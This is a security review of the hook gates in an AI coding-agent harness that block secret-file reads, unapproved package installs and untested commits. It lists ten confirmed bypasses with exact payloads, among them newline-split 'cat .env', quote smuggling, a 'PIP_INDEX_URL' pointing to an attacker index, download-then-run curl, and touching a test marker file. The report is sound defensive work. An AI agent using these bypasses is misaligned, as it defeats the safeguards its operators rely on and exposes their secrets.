# LENS A (execution) — Bootstrap Protocol v2.6.0

- **Reviewed:** commit `0ec72d0` on branch `trust-ramp-graded-autonomy`
- **Date:** 2026-07-28
- **Prompt:** `.claude/checkpoints/METAPROMPT-fable5-review-v2.6.0-LENS-A.md`
- **Reviews:** the fixes made for `docs/bootstrap-protocol-upstream-bugs-2026-07-28.md`
- **Companion lens:** LENS B (spec conformance / regression) —
  `.claude/checkpoints/METAPROMPT-fable5-review-v2.6.0-LENS-B.md`. Run it
  **blind**; the two lenses are split by method, not by area, and B reaching
  F7 independently from the test diff would be strong corroboration.

## Method

Scratch install from `cfg-full.yaml` (service archetype, all three autonomous
modes enabled, `tdd_policy: required`, deps approved = `requests`/`flask`) into
a real git repo outside the protocol tree. 68 files emitted. The protocol repo
itself was not modified.

Every finding was produced by piping JSON into the emitted hook and reading
`$?`. Exit-code convention under test: `0 = allow`, `1 = hook error (the tool
still proceeds)`, `2 = block`. Where blocking is the point, `2` is asserted
specifically — never merely "non-zero".

Baseline: `python3 bin/run-tests` → **1202 checks, 16 suites, 0 failed**, with
all ten findings below live. This is the second consecutive release in which a
fully green suite coexisted with the defects listed here.

---

## F1 — CONFIRMED — secrets-gate: one newline disables the whole Bash surface

`secrets-gate.sh` tokenizes a Bash command with `read -ra _toks <<< "$_cmd"`.
`read` consumes **one line**. Every token after the first newline is invisible.

```
{"tool_name":"Bash","tool_input":{"command":"cd /app\ncat .env"}}   -> rc=0
{"tool_name":"Bash","tool_input":{"command":"cd /app; cat .env"}}   -> rc=2
```

Also allowed: `echo x\ncat secrets/prod.yaml`, `for f in *; do\n cat .env\ndone`,
`cat <<EOF\nx\nEOF\ncp deploy.pem /tmp/`, and a merely leading `\ncat .env`.

This is P0-2 — the fix that extended secrets-gate to the Bash surface — undone
for any multi-line command, which is the normal shape of an agent's Bash call,
not an exotic one. Under-match is the catastrophic direction.

## F2 — CONFIRMED — `norm_cmd` erases newline as a command separator; all four command gates miss

`norm_cmd` runs `tr -s '[:space:]' ' '`, so `\n` becomes a space. `cmd_has_verb`
then anchors on `(^|[;&|(])` — and a space is not in that class. Any verb on the
second or later line is unreachable.

```
git add -A\ngit commit -m wip   -> test-gate rc=0   spec-gate-commit rc=0
git add -A && git commit -m wip -> test-gate rc=2   spec-gate-commit rc=2
git add -A;  git commit -m wip  -> test-gate rc=2
echo build\ngit push origin main-> ci-mirror rc=0
```

Hits `spec-gate-commit`, `test-gate`, `ci-mirror`, `dependency-gate`. It negates
P1-1 for the most common commit idiom: those gates were made synchronous
specifically so `exit 2` would block, and they never reach the `exit 2`.

The SDK substrate got this right — `_dependency_gate` iterates `cmd.splitlines()`
and its comment explains why newlines must be preserved. The shell is the outlier.

Other confirmed misses in the same matcher: `env GIT_AUTHOR=x git commit`
(the regex allows `env` only when immediately followed by `git`),
`/usr/bin/git commit`, `git -c core.editor='vi x' commit` (a global option whose
value contains a space breaks `[^ ]+`). `sh -c 'git commit'` is documented as
accepted (backlog J-1). No false positives found: comments, `grep 'git commit'`,
`echo`, and `git commit-tree` all correctly rc=0.

## F3 — CONFIRMED — dependency-gate: five bypasses that install an unapproved package

```
PIP_INDEX_URL=http://evil.test/simple pip install evil   -> rc=0
python3 -m pip install evil                              -> rc=0   (SDK blocks it)
sudo pip install evil                                    -> rc=0
/usr/bin/pip install evil                                -> rc=0
uv pip install evil                                      -> rc=0
echo hi\npip install evil                                -> rc=0   (F2)
```

A leading `VAR=value` assignment is the cleanest: the regex admits only a literal
`env ` prefix, and `FOO=1 npm install evil` bypasses identically. The
`PIP_INDEX_URL` form is worth calling out on its own — it redirects an *approved*
package to an attacker-controlled index, which the gate would allow regardless.

Unlisted arrival channels, all rc=0: `npx evil-package`, `uvx evil`,
`pnpm dlx evil`, `npm exec evil`, and the two-step
`curl https://x.sh > /tmp/a.sh; bash /tmp/a.sh` (the single-pipe form is blocked).

Correctly blocked: `pip install evil`, `npm install @evil/backdoor` (scope kept),
`cargo add evil`, `npm i -g evil`, `pip install -U evil`, `go install evil@latest`,
`cd /tmp && pip install evil`, `curl … | sh`. Correctly allowed: bare
`npm install`, `mix deps.get`, `npm run install-deps`, `grep -r 'pip install' docs/`.

## F4 — CONFIRMED — `touch .claude/.last-test-pass` disables the test gate, and nothing blocks the touch

```
1. edit src/app.py, no marker      -> test-gate runs pytest, rc=2
2. touch .claude/.last-test-pass   -> secrets-gate rc=0, dependency-gate rc=0
   (Write tool to the same path    -> secrets-gate rc=0, tdd-gate rc=0)
3. same git commit                 -> test-gate rc=0, tests never ran
```

`.last-test-pass` is gitignored and agent-writable; `test-gate` trusts its mtime.
This is the P0-1 class — a gate trusting an agent-writable state file that no gate
protects — reached by a one-word command. The commit message for `0ec72d0` states
"The CLASS was audited across every emitted artifact in all three autonomous
modes; this was the only site." That holds for *code execution*; the
*trust-bypass* half of the class has a second site. (`.last-eval-pass` is the
same shape for eval-gate, which this install did not emit.)

## F5 — CONFIRMED — a missing or shadowed `grep`/`tr` silently turns every command gate into a no-op

Symlink-farm PATH, one binary removed at a time, must-block payloads:

```
missing NONE   dep-gate rc=2 BLOCK     test-gate rc=2 BLOCK
missing grep   dep-gate rc=0 ALLOWED   test-gate rc=0 ALLOWED
missing tr     dep-gate rc=0 ALLOWED   test-gate rc=0 ALLOWED
missing sed    dep-gate rc=2 BLOCK     test-gate rc=2 BLOCK
```

rc=0, no message, no log line, no `hook_fail`. `cmd_has_verb`'s `grep -qE` sits
inside an `if` condition and `norm_cmd`'s `tr` inside a command substitution —
both exempt from `set -e` and therefore from the `ERR` trap, so the fail-closed
machinery never engages. This is exactly the T-1 class the secrets-gate header
says was designed out ("an earlier `tr`-based version exited 127 when `tr` was
off PATH … a pure-bash `shopt` cannot fail open that way"). The lesson was applied
to the pattern matcher and not to the two shared command helpers.

## F6 — CONFIRMED — `secrets` without a trailing slash is not covered, on either substrate

```
Grep{"path":"secrets","pattern":"AWS_SECRET"}     -> rc=0   (shell and SDK)
Bash "cd secrets; cat prod.yaml"                  -> rc=0
Bash "tar cf /tmp/s.tar secrets"                  -> rc=0
Bash "grep -r . secrets/"                         -> rc=2   (control)
```

`secrets/**` normalizes to `secrets/*`, which the anchored form matches against
the bare directory name only with the slash present. A `Grep` whose `path` is the
directory returns matching file contents.

## F7 — CONFIRMED — the SDK substrate never received the P0-2 fix; secrets-gate is not wired to Bash

Executed `build_hooks(RESOLVED_CONFIG)` against a stubbed `claude_agent_sdk`:

```
PreToolUse  matcher='Read|Write|Edit|NotebookEdit|Grep|Glob'   <- secrets-gate
PreToolUse  matcher='Bash'   x3   <- spec-gate-commit, dependency-gate, test-gate

secrets-gate, Bash surface:
  cat .env            -> ALLOW
  grep -r . secrets/  -> ALLOW
  cat deploy.pem      -> ALLOW
```

`settings.json` wires secrets-gate to **both** `Bash` and
`Read|Write|Edit|NotebookEdit|Grep|Glob`; `_GATE_MATCHERS` carries only the
second. So under SDK dispatch `cat .env` is unguarded — the original P0-2
finding, unfixed.

Two claims in the emitted file are falsified by this:

- the comment on `_GATE_MATCHERS`: *"mirrors the shell suite's settings.json
  wiring (templates.HOOK_EVENT_MAP); tests assert the two stay in sync"*
- the binding rule at `gates.py` lines 256–262: *"this module MUST NOT allow what
  the shell blocks, and MUST NOT block what the shell allows"* — violated in both
  directions. It allows `cat .env` (F7); it blocks `python3 -m pip install evil`
  and `echo hi\npip install evil`, which the shell allows (F2/F3).

`test_sdk_gates.py` (73 checks) and `test_gate_substrate.py` (17) pass. **For
LENS B:** the widened matcher-table assertion in `test_sdk_gates.py` is the
likely reason this shipped, and whether adding `Bash` to `_GATE_MATCHERS` is a
seam event is B's question 3, not this lens's call.

## F8 — CONFIRMED — token smuggling past the secrets-gate Bash tokenizer

The tokenizer strips one leading and one trailing quote per token, which does not
survive intra-token quoting or any shell expansion:

```
cat .en''v           -> rc=0        cat 'sec'rets/prod.yaml -> rc=0
cat .en\v            -> rc=0        F=.env; cat $F          -> rc=0
cat .en?             -> rc=0        cat .{env}              -> rc=0
```

Correctly blocked: `cat ".env"`, `cat $HOME/.env`, `base64 <.env`,
`cat ./secrets/*`, `cat ../proj/.env`, tab-separated. Lower severity than F1
because each needs intent, whereas F1 fires on ordinary usage.

## F9 — CONFIRMED — dependency-gate false-blocks common install flags

Only `-e -t --target --prefix --root -d --dest` consume their value; every other
value-taking flag leaves its argument to be read as a package name.

```
pip install --index-url https://internal.example.com/simple requests
  -> rc=2 "not in deps.md approved list: https://internal.example.com/simple"
pip install -i https://pypi.org/simple flask   -> rc=2 (blames the URL)
npm install --registry https://r.example.com flask -> rc=2
pip install --no-binary :all: requests         -> rc=2 (blames ":all:")
pip install -r requirements.txt                -> rc=2 (by design)
```

The first four are wrong and the error names the wrong thing. The last is
intentional and documented — and is item 3 on LENS B's adjudication list, so
whether it is *correct* is B's call, not this lens's. Combined, the five are the
"operator disables the gate" pressure the file's own comments warn about.

## F10 — CONFIRMED — cosmetic: every hook writes a spurious error on first run

```
$ printf '{"tool_name":"Read","tool_input":{"file_path":"src/x.py"}}' \
    | CLAUDE_PROJECT_DIR=$PWD .claude/hooks/secrets-gate.sh
.../hooks/secrets-gate.sh: line 41: .../logs/hooks.log: No such file or directory
rc=0
```

In `_rotate_log`, `wc -c <"$LOG" 2>/dev/null` applies redirections left to right,
so the failing input redirection reports before `2>/dev/null` takes effect. Every
hook, every fresh install, once. Harmless, but it lands in the transcript as a
hook error on a clean run.

---

# What did NOT reproduce

- **The `ERR` trap — the implementer's own stated top risk.** 613 crafted
  commands (glob metacharacters, `$(id)`, backticks, quotes, backslashes, `%s`,
  tabs, newlines, 300-char tokens, control bytes, emoji, empty, `-n`, `-e`, `--`)
  × 14 hooks = **8582 runs, zero** `unexpected hook error`, zero rc outside
  {0,1,2}. A 196-case benign matrix across all hooks and all event shapes gave
  three non-zero results, all correct tdd-gate blocks. Removing each of 12
  binaries in turn produced no spurious `exit 2` on benign input. I could not make
  `set -e` + `ERR` misfire. The trap's real weakness is the opposite one (F5): the
  paths that matter are in `set -e`-exempt contexts, so it never fires at all.
- **P0-1, the arithmetic RCE.** `PATH[$(touch /tmp/PWNED_LENSA)]` written to
  `.claude/sessions/.drift-state-s1` → rc=0, no file created, counter reset to 1.
  Dead. The only other `$(( ))` in the emitted tree is `checked=$((checked + 1))`
  on a loop counter. No `eval`, no `source`, no arithmetic on file content in
  `loop.sh` / `goal-loop.sh` / `auto.sh`. The code-execution audit holds.
- **P0-3a, the 128 KiB env ceiling.** 3 MB and 30 MB payloads naming `.env`, jq
  removed from PATH, python3 present → rc=2 both. Fixed.
- **P0-3b, no parser.** jq and python3 both removed: `ci-mirror`,
  `dependency-gate`, `secrets-gate`, `spec-gate-commit`, `tdd-gate`, `test-gate`
  all rc=2 "BLOCKED (fail-closed)"; advisory hooks rc=1 or 0. Postures correct
  across all 14 hooks. Fixed.
- **P0-3c, unwritable dirs.** Read-only `CLAUDE_PROJECT_DIR` and a nonexistent
  `TMPDIR`: secrets-gate still rc=2. Fixed. (drift-detector rc=1 from an unguarded
  `mkdir -p` at line 158 — advisory, so it degrades correctly, but its counter
  silently stops.)
- **P1-1, async.** No `async` anywhere in the emitted tree; timeouts 600 / 900 /
  120 present in settings.json.
- **The suspected sibling of the mid-session `config.env` regression.** 32-path
  differential across both substrates: `.env`, `.env.production`, `config.env`,
  `prod.env`, `staging.env`, `.ENV`, `MY.ENV`, `.envrc`, `foo.env.bak`,
  `x.env.example`, `sub/.env`, `tmp/.env.local` all block; `my.envelope.gleam`,
  `dev.environment.md`, `docs/no-secrets/plan.md`, `environment.yml`, `dotenv`,
  `a.keychain`, `not-secrets/x.yaml` all allow. Shell and SDK agree on **every
  one**. The dot-segment discriminator is correct. Only F6 (bare `secrets`) is a
  gap, and both substrates share it.
- **Double-layer regex escaping in `sdk_gates_template.py`.** No over- or
  under-escaping surfaced in any executed case; `ere_esc` handled
  `+ ( ) [ ] { } ? . * ^ $ |` correctly in spec-gate-commit.
- **hooks.log rotation.** 1.1 MiB log → rotated to `hooks.log.1`, fresh log. Works.

## Coverage boundary

Nothing here was run against a live Claude Code runtime. Whether a PreToolUse
hook timeout actually fails closed, whether `exit 2` from these hooks blocks the
tool in practice, and whether the SDK `HookMatcher` timeout cancels as assumed
are all still taken from documentation — unchanged from the state the
`checkpoint-20260728-1730-*` record declared. F7 in particular assumes the
consumer dispatches only what `build_hooks` returns.

Not exercised: `retrofit` mode, `eval-gate` (ai-agent archetype only), the
queue/loop drivers under real execution, `bin/trust-ramp`, and the installer's
manifest/digest refusal path.

---

# Suggested fix shape (not applied — this lens reports)

Recommend **one batch after LENS B reports**, not two rounds: F1, F2 and F5 all
live in the shared `_HOOK_HEADER` command helpers prepended to every hook, so
fixing them re-baselines the goldens and burns a freeze exception. Doing that
twice is two risk events for one problem — and `0ec72d0` introduced F1/F2/F5
*while* fixing the previous round, which is the hazard to avoid repeating.

Carve-out: if a real v2.6.0 install is in active use, F1, F4 and F7 are live
holes (F1 fires on ordinary multi-line Bash, no attacker required) and justify
an immediate patch ahead of B.

1. **F1 + F2 share one root cause.** Make shell command parsing line-oriented —
   iterate `while IFS= read -r line` and apply `norm_cmd`/`cmd_has_verb` per
   line. That is what the SDK already does, and its comment explains why. One
   change closes both and brings the substrates into agreement.
2. **F5.** Drop `tr` from `norm_cmd` for parameter expansion, and `grep -qE` from
   `cmd_has_verb` for bash `[[ =~ ]]`. No external binary, cannot fail open —
   the same reasoning the header already gives for choosing `shopt -s nocasematch`
   over `tr`.
3. **F7.** Hand to LENS B first; adding `Bash` to `_GATE_MATCHERS` may be a seam
   event.
4. **F4.** Stop trusting the marker's mtime — verify content, or drop the marker
   optimisation.
5. **The meta-fix.** 1016 checks went green over an RCE; 1202 went green over the
   ten findings above. Whatever else changes, add a differential test that pushes
   one payload corpus through *both* substrates and asserts identical verdicts.
   That is the test that would have caught F7; the "parity" test that exists
   today did not.
